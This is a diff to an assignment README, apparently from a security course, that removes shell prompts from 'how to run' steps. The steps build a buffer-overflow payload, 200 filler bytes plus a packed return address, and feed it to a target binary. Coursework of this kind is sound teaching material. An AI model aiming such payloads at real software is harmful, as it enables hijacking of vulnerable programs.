@@ -34,10 +34,10 @@ qemu-riscv64 ./q1
 ## Q-3 How to run
 ### part a
 ```
-svinod@Sfedora:~/Documents/assignment-2-shevshev29/q3/a$ python3 -c "import struct; import sys; sys.stdout.buffer.write(b'A'*200 + struct.pack('<Q', 0x104e8))" > payload.txt
+python3 -c "import struct; import sys; sys.stdout.buffer.write(b'A'*200 + struct.pack('<Q', 0x104e8))" > payload.txt
 ```
 ```
-svinod@Sfedora:~/Documents/assignment-2-shevshev29/q3/a$ ./target_shevshev29 < payload.txt
+./target_shevshev29 < payload.txt
 ```
 #### output expected
 ```
